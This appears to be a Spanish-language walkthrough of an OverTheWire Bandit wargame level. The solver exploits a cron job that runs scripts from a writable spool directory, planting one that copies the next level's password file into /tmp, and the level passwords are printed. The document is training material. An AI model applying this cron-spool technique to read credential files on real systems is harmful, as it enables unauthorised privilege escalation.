## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solución
```
bandit23@bandit:/tmp/contra24$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/tmp/contra24$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/contra24.txt" > scriptsito.sh
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 scriptsito.sh
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/contra24.txt
cat: /tmp/contra24.txt: No such file or directory
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/contra24.txt
cat: /tmp/contra24.txt: No such file or directory
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/contra24.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
## Notas adicionales
## Referencias